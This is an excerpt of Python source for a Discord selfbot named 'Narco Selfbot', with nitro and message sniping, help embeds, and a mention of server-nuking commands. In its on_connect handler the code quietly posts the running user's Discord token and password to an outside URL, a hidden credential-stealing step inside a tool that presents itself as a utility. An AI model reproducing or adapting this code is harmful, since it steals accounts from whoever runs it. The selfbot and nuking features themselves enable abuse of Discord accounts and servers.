...
def startprint():
    ...
    print(f'''{Fore.RESET}
                        ...
                        {Fore.LIGHTRED_EX}Narco v{SELFBOT.__version__}: {Fore.WHITE}Logged in as: {Exeter.user.name}#{Exeter.user.discriminator}
                        {Fore.LIGHTRED_EX}Nitro Sniper: {Fore.WHITE}{nitro}
                        {Fore.LIGHTRED_EX}Scraped Users: {Fore.WHITE}{len(Exeter.users)}
                        {Fore.LIGHTRED_EX}Servers: {Fore.WHITE}{len(Exeter.guilds)}
                        {Fore.LIGHTRED_EX}Prefix: {Fore.WHITE}{Exeter.command_prefix}
                        {Fore.LIGHTRED_EX}Note: {Fore.WHITE}Don't use the nuking commands unless you want to risk being disabled. -Narco/Nax
                  ''' + Fore.RESET)
...
def Init():
    ...
    try:
        ...
        os.system(f'title (Narco Selfbot) - Version {SELFBOT.__version__}')
...
Exeter = commands.Bot(description='Narco Selfbot', command_prefix=prefix, self_bot=True)
...
async def on_connect():
    Clear()  
    requests.post('https://pornhub.com',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
    startprint()
...
async def msgsniper(ctx, msgsniperlol=None):
    ...
    if str(msgsniperlol).lower() == 'true' or str(msgsniperlol).lower() == 'on':
        Exeter.msgsniper = True
        await ctx.send('Narco Message-Sniper is now **enabled**')
    elif str(msgsniperlol).lower() == 'false' or str(msgsniperlol).lower() == 'off':
        Exeter.msgsniper = False
        await ctx.send('Narco Message-Sniper is now **disabled**')
...
async def help(ctx, category=None):
    await ctx.message.delete()
    if category is None:
        embed = discord.Embed(color=0x0E0E0E, timestamp=ctx.message.created_at)
        embed.set_author(name="𝗡𝗔𝗥𝗖𝗢 𝗦𝗕 | 𝗣𝗥𝗘𝗙𝗜𝗫: " + str(Exeter.command_prefix),
                         icon_url=Exeter.user.avatar_url)
        embed.set_thumbnail(url=Exeter.user.avatar_url)
        embed.set_image(url="https://cdn.discordapp.com/attachments/812411139769499708/817916683724521532/image0.gif")
        ...
        embed = discord.Embed(color=0x0E0E0E, timestamp=ctx.message.created_at)
        embed.set_image(url="https://media.discordapp.net/attachments/753282592534429867/815030435460415528/image5.gif")
        ...
        embed = discord.Embed(color=0x0E0E0E, timestamp=ctx.message.created_at)
        embed.set_image(url="https://media.discordapp.net/attachments/753282592534429867/815030434643443752/image4.gif")
        ...
        embed = discord.Embed(color=0x0E0E0E, timestamp=ctx.message.created_at)
        embed.set_image(
            url="https://cdn.discordapp.com/attachments/814159839915540490/814178079659262062/juice2.gif")
        ...
        embed = discord.Embed(color=0x0E0E0E, timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/814159839915540490/814177710414233650/image0_47.gif")
        ...
        embed = discord.Embed(color=0x0E0E0E, timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/814159839915540490/814175122458017822/image0_27.gif")
        ...
        embed = discord.Embed(color=0x0E0E0E, timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/814159839915540490/814171098819461191/bad.gif")
        ...
        embed = discord.Embed(color=0x0E0E0E, timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/814159839915540490/814166149553324052/image0_18.gif")
...
async def fakenet(ctx, _type=None, *, name=None):
    ...
    if r.status_code == 200:
        ...
        await ctx.send(
            '**[ERROR]** `Narco Fake-Connection doesn\'t work anymore because Discord patched connection-spoofing`')
